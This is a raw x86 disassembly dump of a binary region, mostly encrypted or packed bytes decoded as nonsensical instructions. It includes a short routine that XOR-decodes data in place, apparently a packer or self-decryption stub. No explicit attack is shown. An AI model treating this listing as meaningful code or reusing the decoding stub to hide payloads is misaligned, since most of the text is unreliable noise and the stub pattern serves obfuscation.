  4076db:	repnz xor BYTE PTR [ebx+0x4a3b8fda],0xb8
  4076e3:	sub    al,0xdf
  4076e5:	cmp    BYTE PTR [eax+0x53e14ac4],ch
  4076eb:	sahf   
  4076ec:	popf   
  4076ed:	inc    esi
  4076ee:	das    
  4076ef:	cmp    esp,edx
  4076f1:	test   eax,0xc4ebfdbe
  4076f6:	cmp    al,0x8
  4076f8:	frstor [edx+edx*8]
  4076fb:	cmp    eax,0xdb10bdc6
  407700:	lea    edx,[esi-0x13]
  407703:	mov    eax,0xaeb4a5ca
  407708:	mul    BYTE PTR [ecx]
  40770a:	mov    esi,edi
  40770c:	leave  
  40770d:	imul   esp,edx,0x44606928
  407713:	jnp    0x40775a
  407715:	sahf   
  407716:	les    esp,FWORD PTR [ebx]
  407718:	pop    DWORD PTR [esi]
  40771a:	test   BYTE PTR [edx],bh
  40771c:	xchg   BYTE PTR [edx],bl
  40771e:	dec    esp
  40771f:	mov    ah,0x7d
  407721:	popf   
  407722:	repnz push cs
  407724:	mov    esp,0x35dfb36
  407729:	inc    esp
  40772a:	mov    ds:0xdf8adba3,eax
  40772f:	lods   al,BYTE PTR ds:[esi]
  407730:	jno    0x407784
  407732:	push   0xfd840199
  407737:	outs   dx,DWORD PTR ds:[esi]
  407738:	push   ebp
  407739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40773a:	or     al,0xdb
  40773c:	dec    eax
  40773d:	xor    dl,BYTE PTR [edx]
  40773f:	jb     0x407774
  407741:	sar    ch,1
  407743:	push   ds
  407744:	pop    esp
  407745:	push   0xe9e978f5
  40774a:	inc    eax
  40774b:	out    dx,al
  40774c:	jno    0x407752
  40774e:	imul   ebp,DWORD PTR ds:0x1ba29969,0xc
  407755:	adc    DWORD PTR [esi+0x1b],0xbac14ea
  40775c:	in     al,dx
  40775d:	xor    eax,edi
  40775f:	xchg   ebx,eax
  407760:	scas   eax,DWORD PTR es:[edi]
  407761:	ins    DWORD PTR es:[edi],dx
  407762:	jns    0x4077e1
  407764:	dec    ebx
  407765:	inc    edx
  407766:	xchg   edi,eax
  407767:	dec    esp
  407768:	sbb    eax,0xdc81840d
  40776d:	jmp    0x4076f4
  40776f:	fidiv  WORD PTR [ebp+0x0]
  407772:	clc    
  407773:	out    0x68,eax
  407775:	clc    
  407776:	mov    ds:0x1d49630f,al
  40777b:	mov    ecx,0xb93aab08
  407780:	mov    es,WORD PTR [esi-0x1d]
  407783:	sbb    DWORD PTR [eax-0x5a],edx
  407786:	in     al,0x37
  407788:	out    0xd2,eax
  40778a:	out    0xc6,al
  40778c:	xchg   edi,eax
  40778d:	fsub   QWORD PTR [ebp-0x7ec22deb]
  407793:	mov    edx,DWORD PTR [esi]
  407795:	call   0xb258a3d
  40779a:	imul   esp,DWORD PTR [ebp-0x42],0x38
  40779e:	call   0xbf02:0xa54665c4
  4077a5:	in     al,dx
  4077a6:	stos   DWORD PTR es:[edi],eax
  4077a7:	push   ecx
  4077a8:	push   ebx
  4077aa:	addr16 push 0x6a429006
  4077b0:	pop    ss
  4077b1:	outs   dx,DWORD PTR ds:[esi]
  4077b2:	mov    dl,0x53
  4077b4:	sub    bl,al
  4077b6:	mov    ebx,DWORD PTR [ecx+eax*1]
  4077b9:	popw   ds
  4077bb:	dec    eax
  4077bc:	add    esp,ebp
  4077be:	ins    BYTE PTR es:[edi],dx
  4077bf:	sub    al,0x61
  4077c1:	adc    DWORD PTR [esi+0x2c],edi
  4077c4:	push   ebx
  4077c5:	nop
  4077c6:	lock shl DWORD PTR [ebp+0x741acff2],cl
  4077cd:	clc    
  4077ce:	int    0xc1
  4077d0:	(bad)  
  4077d1:	inc    al
  4077d3:	fist   WORD PTR [ebp-0x44]
  4077d6:	dec    ebx
  4077d7:	xchg   esi,eax
  4077d8:	and    eax,0x1e8cc096
  4077dd:	cmp    al,BYTE PTR [edi+0x6f]
  4077e0:	scas   eax,DWORD PTR es:[edi]
  4077e1:	pop    ecx
  4077e2:	cld    
  4077e3:	and    eax,0x5ef7c62
  4077e8:	inc    esp
  4077e9:	pushf  
  4077ea:	or     ecx,DWORD PTR ds:0x5ae3a79
  4077f0:	into   
  4077f1:	mov    ch,0x11
  4077f3:	jnp    0x4077b4
  4077f5:	and    ebx,DWORD PTR [esi]
  4077f7:	gs mov edx,0x38bce226
  4077fd:	or     edi,ebx
  4077ff:	into   
  407800:	mov    DWORD PTR [esi+0x5f5c7261],eax
  407806:	inc    ecx
  407807:	mov    eax,ds:0x94fea3aa
  40780c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40780d:	push   ss
  40780e:	jle    0x407819
  407810:	iret   
  407811:	mov    ebx,0x50273611
  407816:	les    ebp,FWORD PTR [ebx]
  407818:	jo     0x4077b8
  40781a:	pop    esp
  40781b:	xor    BYTE PTR [edi+0x446f54],dh
  407821:	inc    ecx
  407822:	mov    ebx,0x7271413f
  407827:	ss in  al,0xec
  40782a:	sbb    eax,DWORD PTR [ebp-0x268989c7]
  407830:	jns    0x40787c
  407832:	mov    al,0x96
  407834:	mov    ebx,?
  407836:	jmp    0x407880
  407838:	mov    dl,0xad
  40783a:	jmp    0x407817
  40783c:	cmp    ebp,edx
  40783e:	jmp    0x4077d4
  407840:	sti    
  407841:	ins    DWORD PTR es:[edi],dx
  407842:	inc    ebp
  407843:	hlt    
  407844:	mov    eax,0xe7e9e2b1
  407849:	imul   edx,DWORD PTR ds:0xa1ac0a27,0x77065522
  407853:	mov    ds:0x628fcd0b,al
  407858:	inc    BYTE PTR [ecx+0x3cee179d]
  40785e:	mov    al,ds:0xa8828785
  407863:	fcom   DWORD PTR [ecx]
  407865:	add    eax,0x6aa53290
  40786a:	jbe    0x4078bc
  40786c:	xor    DWORD PTR [edi-0x66],0x7c
  407870:	inc    esp
  407871:	(bad)  
  407872:	xchg   edx,eax
  407873:	and    ecx,DWORD PTR [edi+0x48]
  407876:	sbb    BYTE PTR [ebp+0x7875b8d3],dh
  40787c:	dec    esi
  40787d:	fist   DWORD PTR [esi+0x68e994c6]
  407883:	push   edx
  407884:	bound  cx,DWORD PTR [ebx+0x38]
  407888:	push   0xffffff9e
  40788a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40788b:	(bad)  [ebx-0x1a]
  40788e:	jp     0x40783d
  407890:	add    al,0xeb
  407892:	lock shr ecx,cl
  407895:	jb     0x407876
  407897:	cwde   
  407898:	pop    esi
  407899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40789a:	out    0x8f,eax
  40789c:	clc    
  40789d:	jbe    0x407845
  40789f:	jno    0x40786e
  4078a1:	scas   al,BYTE PTR es:[edi]
  4078a2:	in     eax,dx
  4078a3:	fist   DWORD PTR [ecx-0x70f0a3d2]
  4078a9:	jmp    0x6dbb:0x8b269bb0
  4078b0:	dec    eax
  4078b1:	pusha  
  4078b2:	pop    ds
  4078b3:	mov    bl,0x30
  4078b5:	mov    dh,0xe2
  4078b7:	mov    al,ds:0xee7e2ba0
  4078bc:	popf   
  4078bd:	jae    0x407844
  4078bf:	mov    ch,0xa8
  4078c1:	fidiv  DWORD PTR [esi+0x7df9595f]
  4078c7:	jle    0x40792d
  4078c9:	add    eax,0x5b0ff8d5
  4078ce:	out    dx,al
  4078cf:	mov    ebp,0xe595f9ac
  4078d4:	gs jbe 0x407929
  4078d7:	mov    ah,0x32
  4078d9:	stos   BYTE PTR es:[edi],al
  4078da:	mov    eax,0x23507639
  4078df:	cli    
  4078e0:	loope  0x40792b
  4078e2:	in     al,dx
  4078e3:	and    bh,BYTE PTR [ebx+0x11b99aba]
  4078e9:	sar    DWORD PTR [ebx],0x1f
  4078ec:	add    eax,0x80bad00
  4078f1:	cli    
  4078f2:	jl     0x407900
  4078f4:	mov    ch,0x25
  4078f6:	into   
  4078f7:	(bad)  
  4078f8:	mov    ah,0x2f
  4078fa:	(bad)  
  4078fb:	retf   0x36d6
  4078fe:	frstor [ecx+0x662edb04]
  407904:	sub    bh,dl
  407906:	shl    DWORD PTR [ecx-0x3833c653],0xea
  40790d:	pop    eax
  40790e:	dec    eax
  40790f:	push   0xe679eb18
  407914:	fs enter 0x4717,0xb9
  407919:	push   cs
  40791a:	jne    0x40798c
  40791c:	pop    edi
  40791d:	or     BYTE PTR [edi+0x6e],dh
  407920:	ss dec ecx
  407922:	ds mov ah,0x1d
  407925:	enter  0x186,0x9b
  407929:	xchg   ebp,eax
  40792a:	push   ebx
  40792b:	pop    edx
  40792c:	jo     0x40792e
  40792e:	dec    ebx
  40792f:	outs   dx,DWORD PTR ds:[esi]
  407930:	out    dx,al
  407931:	mov    ch,0x67
  407933:	mov    ch,0x1f
  407935:	push   ebx
  407936:	lods   eax,DWORD PTR ds:[esi]
  407937:	inc    ebp
  407938:	jmp    0x329db555
  40793d:	xchg   ebx,eax
  40793e:	dec    ebp
  40793f:	push   ds
  407940:	clc    
  407941:	out    dx,al
  407942:	retf   
  407943:	mov    dl,BYTE PTR [ebx]
  407945:	fidiv  WORD PTR [edi+ebx*1]
  407948:	mov    edi,0x36ec82c8
  40794d:	(bad)  
  40794e:	(bad)  
  40794f:	repnz mov BYTE PTR [esi+0x35],ah
  407953:	aad    0xc1
  407955:	mov    eax,0x8a8708
  40795a:	jmp    0x37867294
  40795f:	mov    dh,0x70
  407961:	sahf   
  407962:	inc    edi
  407963:	push   ds
  407964:	push   esi
  407965:	xchg   ebp,eax
  407966:	popf   
  407967:	inc    edx
  407968:	daa    
  407969:	pop    es
  40796a:	daa    
  40796b:	xchg   esi,eax
  40796c:	xchg   edx,eax
  40796d:	aas    
  40796e:	add    al,ah
  407970:	xchg   BYTE PTR [eax+0x6d562d5e],al
  407976:	mov    al,ds:0x4e81431d
  40797b:	xchg   BYTE PTR [ebx-0x49fd645f],ch
  407981:	or     ah,BYTE PTR [edx]
  407983:	jne    0x4079ab
  407985:	pop    edx
  407986:	das    
  407987:	test   DWORD PTR [esi+ebp*8+0x53cf7641],ecx
  40798e:	arpl   WORD PTR [eax],bx
  407990:	gs out 0xea,al
  407993:	repz pusha 
  407995:	lods   eax,DWORD PTR ds:[esi]
  407996:	xor    ebp,edi
  407998:	xchg   DWORD PTR [esp+ecx*4],eax
  40799b:	jmp    0x4079bf
  40799d:	sbb    ecx,DWORD PTR [edi+0x62]
  4079a0:	enter  0x39ed,0xa6
  4079a4:	jp     0x407961
  4079a6:	int3   
  4079a7:	inc    eax
  4079a8:	leave  
  4079a9:	add    dh,BYTE PTR [ecx+0x17]
  4079ac:	mov    dl,0x89
  4079ae:	cmp    esp,DWORD PTR [ecx-0x5]
  4079b1:	mov    ?,WORD PTR [eax-0x3c]
  4079b4:	imul   ecx,ecx,0x21
  4079b7:	test   ebx,esi
  4079b9:	sub    eax,DWORD PTR [edi-0x6cdf4ac4]
  4079bf:	cli    
  4079c0:	jnp    0x407a24
  4079c2:	call   0x2474:0x52322edd
  4079c9:	cmp    al,0x4c
  4079cb:	push   ds
  4079cc:	or     ebp,DWORD PTR [edx+0x2a8e01ff]
  4079d2:	dec    esi
  4079d3:	loope  0x4079d6
  4079d5:	adc    BYTE PTR [ebp-0x7b],0x5
  4079d9:	ret    0x5036
  4079dc:	cld    
  4079dd:	jns    0x4079d4
  4079df:	and    al,BYTE PTR [ebx-0x7d]
  4079e2:	xor    al,0xc6
  4079e4:	cs into 
  4079e6:	cli    
  4079e7:	sbb    eax,0xcaf33d2f
  4079ec:	push   esp
  4079ed:	bound  eax,QWORD PTR [edi]
  4079ef:	mov    esp,0xe32e605c
  4079f4:	mov    esi,0xc0bb26f1
  4079f9:	pop    eax
  4079fa:	sub    edi,DWORD PTR [esi]
  4079fc:	outs   dx,DWORD PTR ds:[esi]
  4079fd:	(bad)  
  4079fe:	xor    eax,0xb4bb6058
  407a03:	add    edi,edi
  407a05:	ds out dx,eax
  407a07:	jmp    0x422ab4ad
  407a0c:	neg    edx
  407a0e:	and    al,0xb3
  407a10:	sub    dl,ah
  407a12:	cld    
  407a13:	ret    
  407a14:	adc    al,0x74
  407a16:	mov    ebx,0x8b26cea3
  407a1b:	push   ebp
  407a1c:	test   al,0xc1
  407a1e:	loopne 0x407a22
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	pop    edi
  407a7f:	(bad)  
  407a80:	xlat   BYTE PTR ds:[ebx]
  407a81:	jecxz  0x407a40
  407a83:	pop    ebp
  407a84:	mov    esi,0xbec4bdbe
  407a89:	mov    esi,0x941dd18e
  407a8e:	into   
  407a8f:	fisub  WORD PTR [ecx-0x5ee0516d]
  407a95:	sbb    eax,0xc0bea11f
  407a9a:	callw  0x52af
  407a9e:	inc    ecx
  407a9f:	push   0xffffff99
  407aa1:	mov    al,0xc
  407aa3:	cmp    ebx,esi
  407aa5:	in     eax,0x33
  407aa7:	rcr    BYTE PTR [esp+eax*1],0xe6
  407aab:	lds    ebp,FWORD PTR [ebp-0x4c67597a]
  407ab1:	push   cs
  407ab2:	leave  
  407ab3:	jns    0x407aef
  407ab5:	sub    eax,0xf505935d
  407aba:	fnstcw WORD PTR [ebx+0x24]
  407abd:	out    dx,eax
  407abe:	retf   
  407abf:	xchg   ecx,eax
  407ac0:	rcr    BYTE PTR [ebx-0x1a87cae0],0xc3
  407ac7:	inc    edi
  407ac8:	xor    al,0xe5
  407aca:	jcxz   0x407aa6
  407acd:	std    
  407ace:	push   eax
  407acf:	mov    WORD PTR [ebp+eiz*4-0x2b1d2cd7],cs
  407ad6:	icebp  
  407ad7:	xor    eax,0x6b4b7b19
  407adc:	cmc    
  407add:	and    edx,0xe07b8c5f
  407ae3:	push   0xffffff9f
  407ae5:	and    al,0x7e
  407ae7:	fild   QWORD PTR [ebp-0x7c]
  407aea:	mov    al,ds:0x7ada433
  407aef:	mov    edx,0xa1e81c7a
  407af4:	pushf  
  407af5:	push   ebx
  407af6:	out    dx,eax
  407af7:	leave  
  407af8:	ret    
  407af9:	jmp    0x9213:0x7e6586d0
  407b00:	in     al,dx
  407b01:	mov    ch,0xbe
  407b03:	pop    ds
  407b04:	xor    ch,BYTE PTR ds:0xde63b65c
  407b0a:	mov    edx,0x69b47382
  407b0f:	js     0x407a9a
  407b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b12:	out    0x6d,eax
  407b14:	inc    eax
  407b15:	cmp    BYTE PTR [edx-0x40bf804a],ch
  407b1b:	retf   0xb473
  407b1e:	add    al,0x1a
  407b20:	jmp    0x9369efce
  407b25:	outs   dx,BYTE PTR ds:[si]
  407b27:	inc    edi
  407b28:	or     BYTE PTR [esi+0x570b92d4],ch
  407b2e:	jbe    0x407adc
  407b30:	jns    0x407b0b
  407b32:	aaa    
  407b33:	popa   
  407b34:	ins    DWORD PTR es:[edi],dx
  407b35:	(bad)
  407b39:	inc    edx
  407b3a:	lods   al,BYTE PTR ds:[esi]
  407b3b:	lahf   
  407b3c:	pushf  
  407b3d:	stos   DWORD PTR es:[edi],eax
  407b3e:	cdq    
  407b3f:	stos   DWORD PTR es:[edi],eax
  407b40:	fcmovnu st,st(3)
  407b42:	sbb    ebx,DWORD PTR [ecx-0x70]
  407b45:	mov    ch,0x86
  407b47:	ja     0x407b8a
  407b49:	pop    ebx
  407b4a:	sub    DWORD PTR [eax-0x293f1a4],edi
  407b50:	cmp    bl,ah
  407b52:	and    eax,0x20df8f6a
  407b57:	mov    ?,WORD PTR [eax+0x2b]
  407b5a:	add    eax,0x81b04e67
  407b5f:	sti    
  407b60:	rcl    DWORD PTR [ebx+eax*1],cl
  407b63:	push   edx
  407b64:	in     eax,dx
  407b65:	jb     0x407b18
  407b67:	adc    esp,0xd7d6efa8
  407b6d:	ret    0x36ee
  407b70:	inc    ecx
  407b71:	loop   0x407b81
  407b73:	and    DWORD PTR [esi+eax*4],eax
  407b76:	sub    ch,BYTE PTR [ecx-0x43790a]
  407b7c:	adc    BYTE PTR [edx+edi*4-0x4e0757e8],ch
  407b83:	sar    DWORD PTR [edi],cl
  407b85:	and    eax,0x6fac2946
  407b8a:	fadd   DWORD PTR [ebp-0x33]
  407b8d:	mov    edx,edi
  407b8f:	dec    edi
  407b90:	jp     0x407b9f
  407b92:	(bad)  
  407b94:	ins    BYTE PTR es:[edi],dx
  407b95:	and    DWORD PTR [esp+edi*4-0x453a1abd],0x3c9b018a
  407ba0:	repnz enter 0xee24,0x10
  407ba5:	jbe    0x407bbc
  407ba7:	and    DWORD PTR [bx+di],ebp
  407baa:	sbb    cl,BYTE PTR [edx]
  407bac:	inc    esp
  407bad:	xchg   edi,eax
  407bae:	sub    esp,edi
  407bb0:	frstor [edx]
  407bb2:	jecxz  0x407bce
  407bb4:	add    BYTE PTR [edx+esi*1],ch
  407bb7:	push   edi
  407bb8:	adc    eax,0xab48bd62
  407bbd:	ins    DWORD PTR es:[edi],dx
  407bbe:	and    al,0xb6
  407bc0:	popa   
  407bc1:	shr    BYTE PTR [edx-0x46],cl
  407bc4:	xchg   edi,eax
  407bc5:	mov    dl,0xde
  407bc7:	sti    
  407bc8:	cwd    
  407bca:	lods   eax,DWORD PTR ds:[esi]
  407bcb:	sti    
  407bcc:	(bad)  
  407bcd:	rcr    DWORD PTR [ebp-0x23],cl
  407bd0:	pop    ecx
  407bd1:	sub    ebp,DWORD PTR ds:0xb88cf9f5
  407bd7:	xor    ah,al
  407bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bda:	cmp    DWORD PTR [eax+0x61c656e7],eax
  407be0:	adc    al,0xe3
  407be2:	jo     0x407c42
  407be4:	push   esp
  407be5:	pop    ebp
  407be6:	cmp    al,0xbd
  407be8:	stos   BYTE PTR es:[edi],al
  407be9:	in     eax,0x5a
  407beb:	loopne 0x407c2e
  407bed:	int3   
  407bee:	sub    eax,0xe56bcf56
  407bf3:	push   ds
  407bf4:	adc    eax,0x3dd7d00
  407bf9:	ficom  DWORD PTR [edi+0x503ce647]
  407bff:	retf   0x7389
  407c02:	pop    edi
  407c03:	arpl   WORD PTR [edx-0x3d],bp
  407c06:	ja     0x407c58
  407c08:	shr    bl,1
  407c0a:	fmul   DWORD PTR [edi+edx*8-0x67029b32]
  407c11:	push   edx
  407c12:	sar    DWORD PTR [esi],1
  407c14:	sbb    DWORD PTR [esi],esi
  407c16:	and    al,0x6c
  407c18:	sbb    BYTE PTR [ebx-0x45],dl
  407c1b:	jmp    0x187c:0x49199dda
  407c22:	dec    ebp
  407c23:	in     al,dx
  407c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c25:	ror    ch,1
  407c27:	bound  ebx,QWORD PTR [ebp+0x2f]
  407c2a:	jno    0x407c80
  407c2c:	out    0x2e,eax
  407c2e:	cdq    
  407c2f:	in     al,dx
  407c30:	mov    ebp,0x3717a939
  407c35:	inc    edx
  407c36:	retf   
  407c37:	jmp    0xef0:0x88f06801
  407c3e:	cdq    
  407c3f:	dec    ebx
  407c40:	gs je  0x407c8b
  407c43:	js     0x407c7d
  407c45:	daa    
  407c46:	sub    ecx,DWORD PTR [eax+eax*2]
  407c49:	loope  0x407c11
  407c4b:	dec    edx
  407c4c:	loop   0x407c0e
  407c4e:	xor    DWORD PTR [eax],0xffffffa4
  407c51:	adc    BYTE PTR [ebp-0x7d],bh
  407c54:	mov    ebx,0x8c11a7af
  407c59:	mov    ch,0xfd
  407c5b:	jmp    0x3d88:0xffd2cded
  407c62:	(bad)  ds:0x1dad067e
  407c68:	mov    ds:0x8254135c,eax
  407c6d:	push   edi
  407c6e:	push   edx
  407c6f:	lahf   
  407c70:	ret    0xd384
  407c73:	ds ins BYTE PTR es:[edi],dx
  407c75:	call   0xb04d7c9b
  407c7a:	pop    esi
  407c7b:	and    DWORD PTR [ebp+edi*2+0x1],edx
  407c7f:	jle    0x407c3e
  407c81:	call   0xb98:0xcd7d23fe
  407c88:	test   eax,0x364d6240
  407c8d:	jge    0x407c25
  407c8f:	call   0x2b4:0xbd3ff335
  407c96:	inc    ebx
  407c97:	jae    0x407c1b
  407c99:	in     eax,0x55
  407c9b:	push   esi
  407c9c:	mov    eax,0xdb7e95e6
  407ca1:	xlat   BYTE PTR ds:[ebx]
  407ca2:	sbb    eax,0x9ec13404
  407ca7:	pusha  
  407ca8:	stos   BYTE PTR es:[edi],al
  407ca9:	lahf   
  407caa:	mov    dh,BYTE PTR [eax+0x1f05a40c]
  407cb0:	xor    BYTE PTR [esi-0x5ba5bef5],ch
  407cb6:	arpl   WORD PTR [esi],bx
  407cb8:	imul   edx,DWORD PTR [edx],0xffffff96
  407cbb:	retf   0x3ff8
  407cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cbf:	outs   dx,DWORD PTR ds:[esi]
  407cc0:	inc    esp
  407cc1:	clc    
  407cc2:	ret    0x46bf
  407cc5:	(bad)  
  407cc6:	retf   0x87b4
  407cc9:	imul   esi,ecx,0xffffffef
  407ccc:	outs   dx,BYTE PTR ds:[esi]
  407ccd:	fsubr  st,st(6)
  407ccf:	mov    ecx,0xd99d9f70
  407cd4:	rcr    BYTE PTR [ebp+esi*1+0x47221c72],0x8a
  407cdc:	jl     0x407c62
  407cde:	xchg   ebx,eax
  407cdf:	cdq    
  407ce0:	imul   eax,DWORD PTR [ebx+0x0],0xf290a46d
  407ce7:	mov    ah,0xd5
  407ce9:	mov    eax,0xc4ea0f55
  407cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cef:	push   eax
  407cf0:	pop    esp
  407cf1:	jae    0x407d10
  407cf3:	xchg   ebp,eax
  407cf4:	push   esp
  407cf5:	mov    ds:0xe9068192,al
  407cfa:	fxch   st(3)
  407cfc:	mov    bh,0x54
  407cfe:	jno    0x407d51
  407d00:	mov    bh,0xaf
  407d02:	mov    ch,cl
  407d04:	aas    
  407d05:	add    bh,BYTE PTR [esi]
  407d07:	aaa    
  407d08:	test   al,0x6f
  407d0a:	pop    ebx
  407d0b:	sbb    eax,0xae6824f5
  407d10:	data16 (bad) 
  407d12:	pop    ds
  407d13:	mov    ds:0x1714cce5,eax
  407d18:	les    ebx,FWORD PTR [edi-0x313d18af]
  407d1e:	pop    es
  407d1f:	loopne 0x407d8c
  407d21:	shr    DWORD PTR [ebx],1
  407d23:	inc    edi
  407d24:	mov    esp,0x8857168d
  407d29:	add    BYTE PTR [edi+esi*2+0x48078e7f],al
  407d30:	or     ebx,DWORD PTR [edx-0x75]
  407d33:	call   DWORD PTR [edi]
  407d35:	mov    edi,es
  407d37:	push   0x70c0b2e4
  407d3c:	cmp    ebp,DWORD PTR [ebx]
  407d3e:	cld    
  407d3f:	dec    ebx
  407d40:	mov    edi,0xfa5c3c06
  407d45:	das    
  407d46:	adc    dh,BYTE PTR [edx]
  407d48:	test   DWORD PTR [eax],edx
  407d4a:	lods   al,BYTE PTR ds:[esi]
  407d4b:	lea    eax,[eax-0xf]
  407d4e:	inc    eax
  407d4f:	aas    
  407d50:	dec    ebx
  407d51:	sub    DWORD PTR [ecx-0x50],0x803aea41
  407d58:	mov    ah,0xc7
  407d5a:	mov    eax,ds:0x1e6b15bb
  407d5f:	enter  0xab3d,0x97
  407d63:	mov    edi,0x956666ca
  407d68:	mov    eax,ds:0x9109a7c
  407d6d:	gs xchg ebx,eax
  407d6f:	xchg   ebp,eax
  407d70:	adc    al,0x50
  407d72:	xor    edi,ecx
  407d74:	call   FWORD PTR [edi+0x4abc2e5f]
  407d7a:	mov    al,0xa
  407d7c:	test   BYTE PTR [esi-0x67c1705e],bl
  407d82:	mov    bh,0xaa
  407d84:	dec    edx
  407d85:	sahf   
  407d86:	mov    DWORD PTR [ebx],esp
  407d88:	cmp    BYTE PTR [ebx],bl
  407d8a:	cmp    DWORD PTR [eax-0x6d667c64],ebx
  407d90:	xchg   DWORD PTR [ebp+eiz*1+0x64032987],esp
  407d97:	shr    BYTE PTR [eax+0x5c8ed320],0x42
  407d9e:	xchg   edx,eax
  407d9f:	in     ax,dx
  407da1:	mov    dh,0xe0
  407da3:	xchg   BYTE PTR [ebp+eax*8+0x5],ah
  407da7:	add    eax,0xdf20050f
  407dac:	pop    ecx
  407dad:	push   edx
  407dae:	rcr    DWORD PTR ds:0x1c4098ee,cl
  407db4:	ss pop es
  407db6:	imul   ebx,DWORD PTR [edx+edi*1],0xd39e1fb8
  407dbd:	scas   eax,DWORD PTR es:[edi]
  407dbe:	push   ecx
  407dbf:	inc    edx
  407dc0:	xchg   esp,eax
  407dc1:	mov    DWORD PTR [edx],edx
  407dc3:	mov    al,ds:0x8d09646a
  407dc8:	jnp    0x407db1
  407dca:	pop    ds
  407dcb:	(bad)  
  407dcc:	out    0xdc,al
  407dce:	dec    esp
  407dcf:	xor    DWORD PTR [esi+ecx*8+0x51d83cce],edx
  407dd6:	or     DWORD PTR [eax-0x39],edi
  407dd9:	arpl   WORD PTR [esi],sp
  407ddb:	push   ebx
  407ddc:	dec    edi
  407ddd:	icebp  
  407dde:	push   esp
  407ddf:	and    ah,al
  407de1:	pusha  
  407de2:	fadd   QWORD PTR [ebx+0x79]
  407de5:	inc    eax
  407de6:	sbb    BYTE PTR [edx+0x2cfcd67d],0x82
  407ded:	sub    ecx,DWORD PTR [ecx+0x8]
  407df0:	pop    es
  407df1:	scas   al,BYTE PTR es:[edi]
  407df2:	sbb    eax,DWORD PTR [esi]
  407df4:	(bad)  
  407df5:	jp     0x407daa
  407df7:	xor    edi,ebx
  407df9:	mov    ebp,edx
  407dfb:	mov    ds,WORD PTR [esi]
  407dfd:	dec    edi
  407dfe:	push   edi
  407dff:	scas   eax,DWORD PTR es:[edi]
  407e00:	retf   
  407e01:	jns    0x407e71
  407e03:	mov    edx,0xd49d72e7
  407e08:	enter  0x34b0,0xfd
  407e0c:	mov    dh,0x3a
  407e0e:	mov    ecx,DWORD PTR [ebp+0xc]
  407e11:	shrd   eax,ecx,0x2
  407e15:	shr    ecx,0x2
  407e18:	mov    ecx,DWORD PTR [ebp+0x8]
  407e1b:	mov    edx,DWORD PTR [ebp+0xc]
  407e1e:	xor    eax,edi
  407e20:	shl    ecx,0x1e
  407e23:	xor    edx,edx
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x4226d8
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x4226d8
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
